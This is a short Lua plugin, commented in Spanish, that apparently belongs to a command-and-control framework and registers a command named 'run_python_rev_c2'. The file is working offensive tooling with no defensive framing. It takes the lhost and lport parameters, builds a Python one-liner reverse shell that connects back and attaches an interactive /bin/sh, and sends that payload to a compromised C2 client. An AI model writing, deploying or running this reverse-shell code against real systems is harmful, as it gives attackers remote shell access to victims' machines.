-- Función para ejecutar un comando C2
function run_python_rev_c2()
    -- Obtener parámetros del host y puerto locales
    local lhost = app.params["lhost"]
    local lport = app.params["lport"]

    -- Validar que lhost y lport estén definidos
    if not lhost or not lport then
        return "Error: lhost o lport no está definido."
    end

    -- Construir el payload para la conexión inversa
    local payload = string.format(
        "python -c \"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('%s', %d));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])\"",
        lhost, lport
    )

    -- Enviar el comando al C2
    local run = app.issue_command_to_c2(payload, app.c2_clientid)


    -- Devolver el payload generado
    return "Payload generado: " .. payload
end

-- Registrar el comando
register_command("run_python_rev_c2", run_python_rev_c2)
